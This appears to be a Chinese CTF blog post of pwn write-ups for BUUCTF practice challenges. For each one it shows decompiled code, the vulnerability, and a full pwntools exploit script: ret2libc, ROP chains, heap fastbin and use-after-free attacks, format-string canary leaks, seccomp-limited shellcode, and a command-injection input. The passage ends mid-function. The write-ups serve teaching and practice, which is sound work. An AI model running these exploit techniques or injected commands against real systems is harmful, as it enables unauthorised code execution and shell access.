---
title: BUU_PWN刷题_0x21-0x2F
date: 2021-07-11
tags: PWN
categories: Technology
---

[TOC]



## 0x20.jarvisoj_level3_x64

ret2libc

```python
from pwn import *
context(log_level='debug')
#io = process("./level3_x64")
io = remote("node3.buuoj.cn",29779)
elf = ELF("./level3_x64")
libc = ELF("./libc-x64-2.23.so")
write_plt = elf.plt['write']
read_got = elf.got['read']
main_addr = elf.sym['main']
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1

io.recv()
payload = 'a'*(0x88)+ p64(pop_rdi_ret)+p64(1)
payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(8)+p64(write_plt)+ p64(main_addr)

io.sendline(payload)
read_add = u64(io.recv()[0:8])
print hex(read_add)
base = read_add - libc.symbols["read"]
sys_add = base + libc.symbols["system"]
bin_sh = base + libc.search("/bin/sh").next()

payload = 'a'*(0x88)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr)
io.sendline(payload)
io.interactive()
```

## 0x21.picoctf_2018_rop chain

win1():

```c
void win_function1()
{
  win1 = 1;
}
```

win2():

```c
int __cdecl win_function2(int a1)
{
  int result; // eax

  result = (unsigned __int8)win1;
  if ( win1 && a1 == 0xBAAAAAAD )
  {
    win2 = 1;
  }
  else if ( win1 )
  {
    result = puts("Wrong Argument. Try Again.");
  }
  else
  {
    result = puts("Nope. Try a little bit harder.");
  }
  return result;
}
```

flag():

```c
int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 48, stream);
  if ( win1 && win2 && a1 == 0xDEADBAAD )
    return printf("%s", s);
  if ( win1 && win2 )
    return puts("Incorrect Argument. Remember, you can call other functions in between each win function!");
  if ( win1 || win2 )
    return puts("Nice Try! You're Getting There!");
  return puts("You won't get the flag that easy..");
}
```

构造ROP链

```python
from pwn import *
context(log_level='debug')
io = process("./PicoCTF_2018_rop_chain")
win1 = 0x80485CB
win2 = 0x80485D8
flag = 0x804862B
io.recv()
payload = 'a'*(0x18+4)+p32(win1) + p32(win2)+ p32(flag) + p32(0xBAAAAAAD) +p32(0xDEADBAAD) 
io.sendline(payload)
io.interactive()
```

## 0x22.[ZJCTF 2019]EasyHeap

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

creat没有什么问题，但是edit有问题，可以重新写任意长度。

delete在free后相应的heaparray就置位0。

大致思路是这样

```python
create(0x10,"a"*0x10)#idx0
create(0x80,"b"*0x10)#idx1
create(0x80,"c"*0x10)#idx2  防止与top chunk合并
delete(1)
edit(0,0x30,'a'*0x18+p64(0x91)+p64(0)+p64(magic-0x10))
io.recvuntil("your choice: ")
io.interactive(str(4869))
```

但是很可惜，buu他没有/home/pwn/flag这个文件，所以得用其他的方法了。

另一个思路：

-   首先create 3个chunk
-   使用house of sprite 技术，伪造chunk到heaparray附近，找一个地址开头为7f的来伪造相应大小的fastbin

```
pwndbg> x/32xw 0x6020a0 -3
0x60209d:	0x20000000	0x05212e06	0x0000007f	0x00000000
0x6020ad:	0xe0000000	0x05212df8	0x0000007f	0x00000000
0x6020bd:	0x00000000	0x00000000	0x00000000	0x00000000
0x6020cd:	0x00000000	0x00000000	0x00000000	0x00000000
0x6020dd:	0x10000000	0x0000db50	0x30000000	0x0000db50
0x6020ed <heaparray+13>:	0x50000000	0x0000db50	0x70000000	0x0000db50
0x6020fd <heaparray+29>:	0x00000000	0x00000000	0x00000000	0x00000000
0x60210d <heaparray+45>:	0x00000000	0x00000000	0x00000000	0x00000000
```

-   在chunk1写入/bin/sh，free掉chunk2
-   edit chunk1，并修改chunk2的fd为0x6020b0 -3
-   之后malloc两次，并修改heaparray为free_got.
-   继续ecit0，将free_got改为system
-   再之后delete chunk1就能拿到shell

exp:

```python
from pwn import *
context(log_level='debug')
#io = process("./easyheap")
io = remote("node3.buuoj.cn",26600)
elf = ELF("./easyheap")
def creat_heap(index,size,payload):
	io.recvuntil("Your choice :")
	io.sendline("1")
	io.recvuntil("Size of Heap : ")
	io.sendline(str(size))
	io.recvuntil("Content of heap:")
	io.sendline(payload)

def edit_heap(index,size,payload):
	io.recvuntil("Your choice :")
	io.sendline("2")
	io.recvuntil("Index :")
	io.sendline(str(index))
	io.recvuntil("Size of Heap : ")
	io.sendline(str(size))
	io.recvuntil("Content of heap : ")
	io.sendline(payload)

def delete_heap(index):
	io.recvuntil("Your choice :")
	io.sendline("3")
	io.recvuntil("Index :")
	io.sendline(str(index))
heaparray = 0x6020b0
free_got = elf.got['free']
sys = elf.plt['system']

creat_heap(0,0x68,"a"*10)#idx0
creat_heap(1,0x68,"b"*10)#idx1
creat_heap(2,0x68,"c"*10)#idx2
delete_heap(2)
payload = "/bin/sh\x00" + p64(0)*12 + p64(0x71) +p64(heaparray - 3)
edit_heap(1,size(payload),payload)
payload = "\xaa"*3+p64(0)*4 + p64(free_got)
creat_heap(0,0x68,"aaa")#idx2
creat_heap(0,0x68,'a')#fake_chunk
edit_heap(3,len(payload),payload)
edit_heap(0,len(p64(sys)),p64(sys))
delete_heap(1)
io.interactive()
```

## 0x23.bjdctf_2020_babyrop2

```
gwt@ubuntu:~/Desktop$ checksec bjdctf_2020_babyrop2 
[*] '/home/gwt/Desktop/bjdctf_2020_babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开了对战不可执行和canary。

主函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  gift(argc, argv);
  vuln();
  return 0;
}
```

```c
unsigned __int64 init()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Can u return to libc ?");
  puts("Try u best!");
  return __readfsqword(0x28u) ^ v1;
}
```

```c
unsigned __int64 gift()
{
  char format[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("I'll give u some gift to help u!");
  __isoc99_scanf("%6s", format);
  printf(format);
  puts(byte_400A05);
  fflush(0LL);
  return __readfsqword(0x28u) ^ v2;
}
```

```c
unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Pull up your sword and tell me u story!");
  read(0, buf, 0x64uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

gift()中有格式化字符串，限制了长度，但是可以泄露canary值。

通过调试可以知道canary在格式化字符串的后面

格式化字符串偏移是6：

```python
from pwn import *
context(log_level='debug')
io = process("./bjdctf_2020_babyrop2")
fmt_str = 0x0400A01
pop_rdi_ret = 0x0000000000400993
io.recv()
gdb.attach(io)
payload = "aa%6$p"
io.sendline(payload)
io.recv()
```

所以canary是7.

接下来就是简单的栈溢出了。

```python
from pwn import *
context(log_level='debug')
#io = process("./bjdctf_2020_babyrop2")
io = remote("node3.buuoj.cn",26953)
elf = ELF("./bjdctf_2020_babyrop2")
libc = ELF("./libc-x64-2.23.so")
pop_rdi_ret = 0x0000000000400993
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_addr = elf.sym['vuln']
io.recv()
payload = "%7$p"
io.sendline(payload)
canary = int(io.recv(18),16)
print ("canary-->",canary)
payload = "a"*(0x20 -8) +p64(canary) + p64(123) + p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt) + p64(vuln_addr)
io.sendlineafter("story!\n",payload)
puts_addr = u64(io.recv(6).ljust(8,"\x00"))
print ("puts-->",hex(puts_addr))
base = puts_addr - libc.sym['puts']
system = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = b"a"*(0x18) +p64(canary) + p64(0) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendline(payload)
io.interactive()
```

## 0x24.jarvisoj_test_your_memory

看了看题目，以为会很难，，，，结果其实很简单，就是个简单的栈题。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char s2[11]; // [esp+1Dh] [ebp-13h] BYREF
  int v6; // [esp+28h] [ebp-8h]
  int i; // [esp+2Ch] [ebp-4h]

  v6 = 10;
  puts("\n\n\n------Test Your Memory!-------\n");
  v3 = time(0);
  srand(v3);
  for ( i = 0; i < v6; ++i )
    s2[i] = alphanum_2626[rand() % 0x3Eu];
  printf("%s", s2);
  mem_test(s2);
  return 0;
}
```

```c
int __cdecl mem_test(char *s2)
{
  int result; // eax
  char s[19]; // [esp+15h] [ebp-13h] BYREF

  memset(s, 0, 0xBu);
  puts("\nwhat???? : ");
  printf("0x%x \n", hint);
  puts("cff flag go go go ...\n");
  printf("> ");
  __isoc99_scanf("%s", s);
  if ( !strncmp(s, s2, 4u) )
    result = puts("good job!!\n");
  else
    result = puts("cff flag is failed!!\n");
  return result;
}
```

exp:

```python 
from pwn import *
context(log_level='debug')
#io = process("./memory")
io = remote("node3.buuoj.cn",27913)
elf = ELF("./memory")

system = elf.sym['system']
cat_flag = 0x080487E0
main = elf.sym['main']

#io.recvuntil("> ")

payload = 'a'*(0x13+4) + p32(system)+p32(main) + p32(cat_flag)
io.sendline(payload)
io.interactive()
```

## 0x25.bjdctf_2020_router

emmm....这题怎么说呢看了半天，结果算是个脑洞题吧，就linux命令拼接。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  char buf[16]; // [rsp+10h] [rbp-70h] BYREF
  char dest[8]; // [rsp+20h] [rbp-60h] BYREF
  __int64 v7; // [rsp+28h] [rbp-58h]
  int v8; // [rsp+30h] [rbp-50h]
  char v9; // [rsp+34h] [rbp-4Ch]
  char v10[56]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  *(_QWORD *)dest = ' gnip';
  v7 = 0LL;
  v8 = 0;
  v9 = 0;
  v4 = 0;
  puts("Welcome to BJDCTF router test program! ");
  while ( 1 )
  {
    menu();
    puts("Please input u choose:");
    v4 = 0;
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:                                   // ping
        puts("Please input the ip address:");
        read(0, buf, 0x10uLL);
        strcat(dest, buf);
        system(dest);
        puts("done!");
        break;
      case 2:                                   // test
        puts("bibibibbibibib~~~");
        sleep(3u);
        puts("ziziizzizi~~~");
        sleep(3u);
        puts("something wrong!");
        puts("Test done!");
        break;
      case 3:                                   // leave comments
        puts("Please input what u want to say");
        puts("Your suggest will help us to do better!");
        read(0, v10, 0x3AuLL);
        printf("Dear ctfer,your suggest is :%s", v10);
        break;
      case 4:                                   // root
        puts("Hey guys,u think too much!");
        break;
      case 5:
        puts("Good Bye!");
        exit(-1);
      default:
        puts("Functional development!");
        break;
    }
  }
}
```

exp:

```python
from pwn import *
context(log_level='debug')
#io = process("./bjdctf_2020_router")
io = remote("node3.buuoj.cn",28235)
io.recv()
io.sendline("1")
io.recv()
io.sendline("1&cat flag")
io.recv()
```

## 0x26.hitcontraining_uaf

一开始总是指针偏移的形式展示notelist，按y然后char * 或者char**就可以数组显示了。(int也可)

add:

```c
int **add_note()
{
  int **result; // eax
  int **v1; // esi
  char buf[8]; // [esp+0h] [ebp-18h] BYREF
  size_t size; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  result = count;
  if ( count > 5 )
    return puts("Full");
  for ( i = 0; i <= 4; ++i )
  {
    result = (&notelist)[i];
    if ( !result )
    {
      (&notelist)[i] = malloc(8u);
      if ( !(&notelist)[i] )
      {
        puts("Alloca Error");
        exit(-1);
      }
      *(&notelist)[i] = print_note_content;
      printf("Note size :");
      read(0, buf, 8u);
      size = atoi(buf);
      v1 = (&notelist)[i];
      v1[1] = malloc(size);
      if ( !(&notelist)[i][1] )
      {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, (&notelist)[i][1], size);
      puts("Success !");
      return ++count;
    }
  }
  return result;
}
```

add中首先malloc了8，分别存放print_note_content和content的地址。

print:

```c
int **print_note()
{
  int **result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = (&notelist)[v2];
  if ( result )
    result = (*(&notelist)[v2])((&notelist)[v2]);
  return result;
}
```

打印print_note_content((&notelist)[v2])。

delete：

```c
_DWORD *del_note()
{
  _DWORD *result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = (&notelist)[v2];
  if ( result )
  {
    free((&notelist)[v2][1]);
    free((&notelist)[v2]);
    result = puts("Success");
  }
  return result;
}
```

del只是free并没有把指针置空，存在uaf

后面还有个后门函数magic

思路：

-   先创建两个，然后delete掉

```
pwndbg> bin
fastbins
0x10: 0x923a038 —▸ 0x923a000 ◂— 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x923a048 —▸ 0x923a010 ◂— 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

-   之后创建一个，往里面写magic的地址就OK

```
pwndbg> bin
fastbins
0x10: 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x923a048 —▸ 0x923a010 ◂— 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

exp：

```python
from pwn import *
#io = process("./hacknote")
io = remote("node3.buuoj.cn",29112)
elf=ELF('./hacknote')
magic_addr=elf.symbols['magic']
context(log_level='debug')
def add_note(size,payload):
	io.recvuntil("Your choice :")
	io.sendline("1")
	io.sendline(str(size))
	io.recvuntil("Content :")
	io.sendline(payload)
	io.recvuntil("Success !")
def print_note(index):
	io.recvuntil("Your choice :")
	io.sendline("3")
	io.recvuntil("Index :")
	io.sendline(str(index))
def delete_note(index):
	io.recvuntil("Your choice :")
	io.sendline("2")
	io.recvuntil("Index :")
	io.sendline(str(index))
add_note(0x20,"aaaa")
add_note(0x20,"bbbb")
delete_note(0)
delete_note(1)
add_note(8,p32(magic_addr))
print_note(0)
io.interactive()
```





## 0x27.picoctf_2018_buffer overflow 1

```c
int vuln()
{
  int v0; // eax
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  gets(s);
  v0 = get_return_address();
  return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", v0);
}
```

```c
int win()
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 64, stream);
  return printf(s);
}
```

exp:

```python
from pwn import *
#io = process("./PicoCTF_2018_buffer_overflow_1")
io = remote("node3.buuoj.cn",27682)
win_add = 0x80485CB
payload = 'a'*(0x28+4) + p32(win_add)
io.recv()
io.sendline(payload)
io.interactive()
```

## 0x28.pwnable_orw

挺有意思的一个题。

```
gwt@ubuntu:~/Desktop$ checksec orw 
[*] '/home/gwt/Desktop/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

开了canary。

这题其实就是往里面写shellcode，但是写入到shellcode有要求。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

>   seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。
>
>   seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。

执行了两次prctl函数。

>   第一次调用prctl函数 ————禁止提权 
>
>   第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit

那么就是，打开文件，读flag文件，然后输出flag文件内容。

-   打开flag，sys_open(file,0,0)，系统调用号为5

```assembly
push 0x0	#字符串结尾
push 0x67616c66 #flag
mov ebx,esp
xor ecx,ecx			#0
xor edx,edx			#0
mov eax,0x5
int 0x80
```

-   读文件，sys_read(fd=3,file,0x30)，系统调用号为3

```assembly
mov eax,0x3
mov ecx,ebx
mov ebx,0x3  #fd
mov edx,0x30
int 0x80
```

-   输出，sys_write(1,file,0x30)，系统调用号为4

```assembly
mov eax,0x4
mov ebx,0x1
int 0x80
```

exp:

```python
from pwn import *
#io = remote("node3.buuoj.cn", 27008)
io = process("./orw")
shellcode = asm('push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80')
shellcode+=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80')
shellcode+=asm('mov eax,0x4;mov ebx,0x1;int 0x80')
io.sendlineafter('shellcode:', shellcode)
io.interactive()
```

## 0x29.wustctf2020_getshell

一个水题。

exp:

```python
from pwn import *
#io = process("./wustctf2020_getshell")
io = remote("node3.buuoj.cn",27728)
back_door = 0x0804851B
payload = 'a'*(0x18+4)+p32(back_door)
io.recv()
io.sendline(payload)
io.interactive()
```

## 0x2A.cmcc_simplerop

```shell
gwt@ubuntu:~/Desktop$ file simplerop 
simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped
gwt@ubuntu:~/Desktop$ checksec simplerop 
[*] '/home/gwt/Desktop/simplerop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
gwt@ubuntu:~/Desktop$ 
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h] BYREF

  puts("ROP is easy is'nt it ?");
  printf("Your input :");
  fflush(stdout);
  return read(0, &v4, 100);
}
```

ida显示偏移是0x14，可以调试下。

使用cyclic生成一些测试的字符。

```shell
gwt@ubuntu:~$ cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

可以看出偏移：

```shell
Program received signal SIGSEGV (fault address 0x61616169)
pwndbg> cyclic -l 0x61616169
32
pwndbg> 
```

是32 ，也就是0x20，（这里ida出了问题）

存在int 0x80 中断指令

```shell
gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --ropchain | grep 'int 0x80'
0x08093b43 : add bh, al ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
0x080493df : add byte ptr [eax], al ; int 0x80
0x08092190 : add byte ptr [eax], al ; mov eax, edi ; mov ecx, 0x81 ; int 0x80
0x08092191 : add byte ptr [ecx + 0x81b9f8], cl ; add byte ptr [eax], al ; int 0x80
0x0806c421 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80
0x0806e908 : clc ; mov ecx, 0x80 ; int 0x80
0x08092193 : clc ; mov ecx, 0x81 ; int 0x80
0x08093b45 : inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
0x080493e1 : int 0x80
0x0807b3ea : ja 0x807b3f0 ; add byte ptr [eax], al ; int 0x80
0x080b9851 : jp 0x80b985a ; int 0x80
0x080b9a77 : jp 0x80b9a81 ; int 0x80
0x08093b44 : mov dword ptr [ebp - 0x7c], 0x51 ; int 0x80
0x080493d9 : mov dword ptr [esp + 0x2c], 0x51 ; int 0x80
0x0807b3e9 : mov eax, 0x77 ; int 0x80
0x0807b3e0 : mov eax, 0xad ; int 0x80
0x0806c420 : mov eax, 1 ; int 0x80
0x0806e907 : mov eax, edi ; mov ecx, 0x80 ; int 0x80
0x08092192 : mov eax, edi ; mov ecx, 0x81 ; int 0x80
0x0806e909 : mov ecx, 0x80 ; int 0x80
0x08092194 : mov ecx, 0x81 ; int 0x80
0x0806eeef : nop ; int 0x80
0x0807b3df : nop ; mov eax, 0xad ; int 0x80
0x0806eeee : nop ; nop ; int 0x80
0x0807b3de : nop ; nop ; mov eax, 0xad ; int 0x80
0x0806eeec : nop ; nop ; nop ; int 0x80
0x0807b3dc : nop ; nop ; nop ; mov eax, 0xad ; int 0x80
0x0806eeea : nop ; nop ; nop ; nop ; int 0x80
0x0806eee8 : nop ; nop ; nop ; nop ; nop ; int 0x80
0x0807b3e7 : nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x0806c41f : or byte ptr [eax + 1], bh ; int 0x80
0x0807b3e8 : pop eax ; mov eax, 0x77 ; int 0x80
0x0806c41e : push cs ; or byte ptr [eax + 1], bh ; int 0x80
0x080b9a78 : push es ; int 0x80
0x08093b42 : sldt edi ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
0x08093b46 : test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
0x0806e905 : xor esi, esi ; mov eax, edi ; mov ecx, 0x80 ; int 0x80
	[+] Gadget found: 0x80493e1 int 0x80
	p += pack('<I', 0x080493e1) # int 0x80


或者：
gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --only "pop|ret"
Gadgets information
============================================================
0x0809da92 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0807bf7d : pop ds ; ret
0x0809da8a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bae06 : pop eax ; ret
0x08071e3a : pop eax ; ret 0x80e
0x0805b3ad : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809de85 : pop ebp ; pop esi ; pop edi ; ret
0x0804838e : pop ebp ; ret
0x080a96e5 : pop ebp ; ret 0x10
0x080966d9 : pop ebp ; ret 0x14
0x08070a36 : pop ebp ; ret 0xc
0x0805ab34 : pop ebp ; ret 4
0x08049bc0 : pop ebp ; ret 8
0x0809de84 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080bd793 : pop ebx ; pop edi ; ret
0x0806e829 : pop ebx ; pop edx ; ret
0x08091f08 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a96e2 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x080966d6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070a33 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ab31 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bbd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x080499d9 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a54 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d797c : pop ebx ; ret 0x6f9
0x08099937 : pop ebx ; ret 8
0x0806e851 : pop ecx ; pop ebx ; ret
```

存在：

```
0x080bae06 : pop eax ; ret
0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
```

系统调用：int80(11,"/bin/sh",null,null)，其中后面的四个参数分别是eax,ebx,ecx,edx。

但是没有/bin/sh字符串，需要输入，有read函数，将binsh写入bss段，然后直接调用，这题没有开PIE，bss的地址就是绝对地址。

ebx：文件描述符

ecx：指向要写入的字符串的指针

edx：要写入的字符串长度

payload：

`payload = 'a'\*0x20 + p32(read_addr) + p32(pop_edcbx) + p32(0) + p32(binsh_addr) + p32(0x8)`
`payload += p32(pop_eax) + p32(0xb) + p32(pop_edcbx) + p32(0) +p32(0) + p32(binsh_addr) + p32(int_addr)`

Exp：

```python
from pwn import *
context(log_level='debug')
#io = process("./simplerop")
io = remote("node4.buuoj.cn",26293)
elf = ELF('./simplerop')
int_80 = 0x080493e1
pop_eax = 0x080bae06
pop_edx_ecx_ebx = 0x0806e850
read_addr = elf.sym['read']
bss_bin_sh_addr = 0x080EB590
payload = 'a'*0x20 
payload += p32(read_addr)
payload += p32(pop_edx_ecx_ebx)
payload += p32(0) 
payload += p32(bss_bin_sh_addr)
payload += p32(0x8)
payload += p32(pop_eax) 
payload += p32(0xb) 
payload += p32(pop_edx_ecx_ebx) 
payload += p32(0)
payload += p32(0)
payload += p32(bss_bin_sh_addr)
payload += p32(int_80)
io.recv()
io.send(payload)
io.send('/bin/sh')
io.interactive()
```

## 0x2B.babyfengshui_33c3_2016

```
gwt@ubuntu:~/Desktop$ checksec babyfengshui_33c3_2016 
[*] '/home/gwt/Desktop/babyfengshui_33c3_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h] BYREF
  int v1; // [esp+4h] [ebp-14h] BYREF
  int v2; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", &v2, &v0);
      add(v2);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      delete(v2);
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      display(v2);
    }
    if ( v1 == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      update(v2);
    }
    if ( v1 == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( byte_804B069 > 0x31u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

add:

```c
_DWORD *__cdecl add(int a1)
{
  void *s; // [esp+14h] [ebp-14h]
  _DWORD *v3; // [esp+18h] [ebp-10h]

  s = malloc(a1);
  memset(s, 0, a1);
  v3 = malloc(0x80u);
  memset(v3, 0, 0x80u);
  *v3 = s;
  *(&ptr + byte_804B069) = v3;
  printf("name: ");
  input(*(&ptr + byte_804B069) + 4, 124);
  update(byte_804B069++);
  return v3;
}
```

add函数申请了两次，其中把第一次申请的空间写入了第二次申请的空间，第二次申请的空间大小是固定的。

```c
struct Node{
	char * s;
	char name[0x7C];
}
```

delete：

```c
unsigned int __cdecl delete(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < byte_804B069 && (&ptr)[a1] )
  {
    free(*(&ptr)[a1]);
    free((&ptr)[a1]);
    (&ptr)[a1] = 0;
  }
  return __readgsdword(0x14u) ^ v2;
}s
```

free并赋值为0.

display：

```c
unsigned int __cdecl display(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < byte_804B069 && *(&ptr + a1) )
  {
